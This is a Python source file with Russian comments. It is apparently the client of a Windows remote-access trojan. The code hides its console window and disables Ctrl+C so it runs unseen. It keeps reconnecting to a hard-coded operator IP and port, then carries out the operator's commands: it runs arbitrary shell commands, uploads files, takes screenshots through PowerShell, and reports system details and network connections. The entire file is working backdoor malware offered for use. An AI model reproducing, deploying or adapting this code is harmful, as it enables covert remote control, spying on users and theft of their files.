# -*- coding: utf-8 -*-
import socket
import os
import subprocess
import sys
import time
import ctypes

# ========== ПОЛНОЕ УНИЧТОЖЕНИЕ КОНСОЛИ ==========
if sys.platform == "win32":
    # 1. Получаем handle окна
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        # 2. Убираем из панели задач
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        # 3. Делаем невидимым
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        # 4. Отключаем отрисовку
        ctypes.windll.user32.SetWindowLongW(hwnd, -20, ctypes.windll.user32.GetWindowLongW(hwnd, -20) ^ 0x80000)
        # 5. Прячем из Alt+Tab
        ctypes.windll.user32.SetWindowLongW(hwnd, -8, 0x80)
        # 6. Ещё раз скрываем для верности
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        # 7. Убиваем процесс консоли
        ctypes.windll.kernel32.FreeConsole()
    
    # 8. Запускаем поток-убийцу (на всякий случай)
    import threading
    def destroy_console():
        while True:
            try:
                h = ctypes.windll.kernel32.GetConsoleWindow()
                if h:
                    ctypes.windll.user32.ShowWindow(h, 0)
                    ctypes.windll.kernel32.FreeConsole()
            except:
                pass
            time.sleep(0.05)
    
    thread = threading.Thread(target=destroy_console, daemon=True)
    thread.start()
    
    # 9. Отключаем Ctrl+C
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
# =================================================

SERVER_IP = "192.168.31.177"  # ТВОЙ IP (ПОМЕНЯЙ!)
SERVER_PORT = 5555

# ===== ВСЕ ФУНКЦИИ БЕЗ ИЗМЕНЕНИЙ =====
def get_system_info():
    return f"""Computer: {os.getenv('COMPUTERNAME', 'Unknown')}
User: {os.getenv('USERNAME', 'Unknown')}
OS: {os.getenv('OS', 'Unknown')}
Current Dir: {os.getcwd()}"""

def list_files(path):
    try:
        files = os.listdir(path if path else ".")
        result = f"Directory: {os.path.abspath(path if path else '.')}\n"
        result += "-"*40 + "\n"
        for f in files:
            full = os.path.join(path if path else ".", f)
            if os.path.isdir(full):
                result += f"[DIR]  {f}\n"
            else:
                size = os.path.getsize(full)
                result += f"[FILE] {f} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Error: {e}"

def send_file(sock, path):
    try:
        if not os.path.exists(path):
            sock.send(b"ERROR: File not found")
            return
        size = os.path.getsize(path)
        sock.send(str(size).encode())
        ack = sock.recv(1024)
        with open(path, "rb") as f:
            sock.sendall(f.read())
    except:
        sock.send(b"ERROR: Send failed")

def take_screenshot():
    try:
        ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$stream = New-Object System.IO.MemoryStream
$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
[System.Convert]::ToBase64String($stream.ToArray())
'''
        result = subprocess.run(["powershell", "-Command", ps_script], 
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout:
            import base64
            return base64.b64decode(result.stdout)
        return b"SCREEN_ERROR: PowerShell failed"
    except Exception as e:
        return f"SCREEN_ERROR: {e}".encode()

def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, 
                               capture_output=True, text=True, timeout=30)
        return (result.stdout + result.stderr).encode()
    except Exception as e:
        return f"ERROR: {e}".encode()

def get_netstat():
    try:
        result = subprocess.run(["netstat", "-an"], 
                               capture_output=True, text=True, timeout=10)
        return result.stdout.encode()
    except Exception as e:
        return f"ERROR: {e}".encode()

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

if __name__ == "__main__":
    while True:
        try:
            sock = connect()
            sock.send(b"WINDOWS_CLIENT_READY")
            
            while True:
                try:
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    if cmd == "EXIT":
                        sock.close()
                        sys.exit(0)
                    
                    elif cmd == "SYSTEM_INFO":
                        sock.send(get_system_info().encode())
                    
                    elif cmd.startswith("LIST "):
                        path = cmd[5:].strip()
                        sock.send(list_files(path).encode())
                    
                    elif cmd.startswith("CD "):
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path)
                            sock.send(f"OK: {os.getcwd()}".encode())
                        except Exception as e:
                            sock.send(f"ERROR: {e}".encode())
                    
                    elif cmd.startswith("GET "):
                        send_file(sock, cmd[4:].strip())
                    
                    elif cmd.startswith("CMD "):
                        sock.send(execute_cmd(cmd[4:].strip()))
                    
                    elif cmd == "SCREEN":
                        img = take_screenshot()
                        if isinstance(img, bytes) and not img.startswith(b"SCREEN_ERROR"):
                            sock.send(str(len(img)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(img)
                        else:
                            sock.send(img)
                    
                    elif cmd == "NETSTAT":
                        sock.send(get_netstat())
                    
                    else:
                        sock.send(b"UNKNOWN COMMAND")
                        
                except Exception as e:
                    break
                    
            sock.close()
        except:
            time.sleep(5)
